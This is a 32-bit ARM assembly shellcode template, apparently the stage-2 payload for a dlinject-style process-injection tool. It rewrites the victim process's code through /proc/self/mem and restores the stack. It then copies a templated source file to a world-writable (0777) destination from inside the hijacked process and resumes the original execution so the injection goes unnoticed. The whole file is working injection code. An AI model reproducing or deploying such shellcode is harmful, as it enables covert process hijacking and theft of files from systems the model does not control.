b _start

.globl _start
_start:

// Based on the stage 2 code included with dlinject.py
// no relative offsets required, because everything is done using syscalls

// 32-bit ARM's ldr instruction can only refer to data that starts relatively close to the instruction
// So this code is interleaved with data


b openProcSelfMem

openProcSelfMem:
	// Open /proc/self/mem
	mov r7, #5				@ SYS_OPEN
	//ldr r1, =proc_self_mem
	mov r1, pc
	b openProcSelfMem2

proc_self_mem:
	.ascii "/proc/self/mem\0"
	.balign 8

openProcSelfMem2:
	mov r0, r1				@ path
	mov r1, #2       		@ flags (O_RDWR)
	mov r2, #0        		@ mode
	swi 0x0					@ syscall
	mov r5, r0        		@ save the fd for later
	.ltorg
	b restoreCode

restoreCode:

	// seek to code
	mov r7, #19      					@ SYS_LSEEK
	mov r0, r5    						@ fd
	//ldr r1, =[VARIABLE:RIP:VARIABLE]  @ offset
	ldr r1, [pc]  						@ offset
	b restoreCode2
saved_rip:
	.word [VARIABLE:RIP:VARIABLE]
	.balign 4

restoreCode2:
	mov r2, #0    						@ whence (SEEK_SET)
	swi 0x0								@ syscall
	
	// restore code
	mov r7, #4                   					@ SYS_WRITE
	mov r0, r5                 					@ fd
	mov r1, pc       							@ buf
	b restoreCode3
old_code:
	.byte [VARIABLE:CODE_BACKUP_JOIN:VARIABLE]
	.balign 4

restoreCode3:
	ldr r2, [pc]   	@ count
	b restoreCode4

code_backup_lenth:
	.word [VARIABLE:LEN_CODE_BACKUP:VARIABLE]
	.balign 4

restoreCode4:
	swi 0x0											@ syscall

	// close /proc/self/mem
	mov r7, #6			@ SYS_CLOSE
	mov r0, r5  		@ fd
	swi 0x0				@ syscall
	.ltorg
		
	//b moveToNewStack


restoreStack:
	
	// restore original stack
	ldr r0, [pc]
	b restoreStack1
old_stack_address:
	.word [VARIABLE:RSP_MINUS_STACK_BACKUP_SIZE:VARIABLE]
	.balign 4

restoreStack1:
	mov r1, pc			@ source
	b restoreStack2
old_stack:
	.byte [VARIABLE:STACK_BACKUP_JOIN:VARIABLE]
	.balign 4
	
restoreStack2:
	ldr r2, [pc]
	b restoreStack3

stack_backup_size:
	.word [VARIABLE:STACK_BACKUP_SIZE:VARIABLE]
	.balign 4

rsp_minus_sb_size:
	.word [VARIABLE:RSP_MINUS_STACK_BACKUP_SIZE:VARIABLE]
	.balign 4

restoreStack3:
	cmp r2, #0
	ble restoreStack4
	
	ldr r4, [r1]
	str r4, [r0]
	
	sub r2, r2, #4
	add r0, r0, #4
	add r1, r1, #4
	b restoreStack3

restoreStack4:
	//mov rdi, [VARIABLE:RSP_MINUS_STACK_BACKUP_SIZE:VARIABLE]
	//lea rsi, old_stack[rip]
	//mov rcx, [VARIABLE:STACK_BACKUP_SIZE:VARIABLE]
	//rep movsb

	//lea rsp, new_stack_base[rip-[VARIABLE:STACK_BACKUP_SIZE:VARIABLE]]

	b shellCode
	
shellCode:
	.balign 8
		
	// using GCC's own =relative_reference magic doesn't work when injecting the shellcode
	// so I rolled my own using this spaghetti code trick that's straight out of the early 80s
	// the branch instruction in this code is 4 bytes long, so I stash the string immediately after it
	// then I know that it will be 4 bytes after the program counter when it hits that line, 
	// which is exactly what the pc register will be set to
	mov r8, pc
	b openSourceFile

sourcefile:
	.ascii "[VARIABLE:sourcefile:VARIABLE]\0"
	.balign 8

openSourceFile:
	// Open source file
	mov r7, #5			@ SYS_OPEN
	mov r0, r8
	mov r1, #0       	@ flags (O_RDONLY)
	mov r2, #0        	@ mode
	swi 0x0				@ syscall
	mov r5, r0        	@ source fd
	
	mov r12, pc
	b openDestFile
destfile:
	.ascii "[VARIABLE:destfile:VARIABLE]\0"
	.balign 8
	
openDestFile:
	// Open destination file
	mov r7, #5			@ SYS_OPEN
	mov r0, r12
	mov r1, #0x42       @ flags (O_RDWR | O_CREAT)
	mov r2, #1			@ mode:  make destination world-writable
	mov r2, r2, lsl #8	@ Can't mov 0777 / 0x1ff as an immediate into a register on ARM
	add r2, r2, #0xff  
	swi 0x0				@ syscall
	mov r10, r0        	@ dest fd
	
	.ltorg
//	b beginCopy

// beginCopy:
	// create a stack variable to use as a copy buffer
	// instead of using a variable defined in this file, because that would result in writing to executable memory
	sub sp,sp,#0x10
	mov r9, #0
	str r9, [sp, #0x8]
	mov r9, sp

copyByteLoop:
	
	// read a single byte at a time to avoid more complex logic
	mov r7, #3			@ SYS_READ
	mov r0, r5			@ fd
	mov r1, r9       	@ buffer
	mov r2, #1        	@ number of bytes to read
	swi 0x0				@ syscall

	// if no char was read (usually end-of-file), processing is complete
	cmp r0, #1        	@ result of read operation
	blt doneCopying
		
	// write the byte to the destination file
	mov r7, #4			@ SYS_WRITE   
	mov r0, r10			@ fd
	mov r1, r9       	@ buffer
	mov r2, #1        	@ number of bytes to write
	swi 0x0				@ syscall

	b copyByteLoop

doneCopying:
	
	// discard the buffer stack variable
	add sp,sp,#0x10

	// close file handles
	mov r7, #6			@ SYS_CLOSE
	mov r0, r5  		@ fd
	swi 0x0				@ syscall
	
	mov r7, #6			@ SYS_CLOSE
	mov r0, r10			@ fd
	swi 0x0				@ syscall
		
	// exit for now
	//mov r7, #1			@ SYS_EXIT
	//mov r0, #0  		@ return code
	//swi 0x0				@ syscall
	
	// restore registers?

	// mov rsp, [VARIABLE:RSP:VARIABLE]
	
	// b [old_rip]
	
	// restore registers
	sub sp, r11, #0x4
	//ldmia sp!, {lr}
	ldmia sp!, {r0-r12}
	//ldmia sp!, {r0-r12 lr}

	// restore stack pointer
	ldr r0, [pc]
	b restoreStackPointer2
	
old_stack_pointer:
	.word [VARIABLE:RSP:VARIABLE]
	.balign 4

restoreStackPointer2:	
	
	// load the stored instruction pointer value stored right after this instruction into the program counter register
	ldr pc, [pc]
	//ldr pc, [pc]
	//ldr r0, [pc]
	//bx r0
	//bx [old_rip]

old_rip:
	.word [VARIABLE:RIP:VARIABLE]
	.balign 4

old_rip2:
	.word [VARIABLE:RIP:VARIABLE]
	.balign 4

format_string:
	.ascii "DEBUG: %s\n\0"
	.balign 8
	
//This section is out of order because it refers to the new_stack_base variable that has to be at the end

moveToNewStack:
.balign 8

// move pushed regs to our new stack
//lea rdi, new_stack_base[rip-[VARIABLE:STACK_BACKUP_SIZE:VARIABLE]]
//mov rsi, [VARIABLE:RSP_MINUS_STACK_BACKUP_SIZE:VARIABLE]
//mov rcx, [VARIABLE:STACK_BACKUP_SIZE:VARIABLE]
//rep movsb

b restoreStack

new_stack:
	.balign 0x8000

new_stack_base:

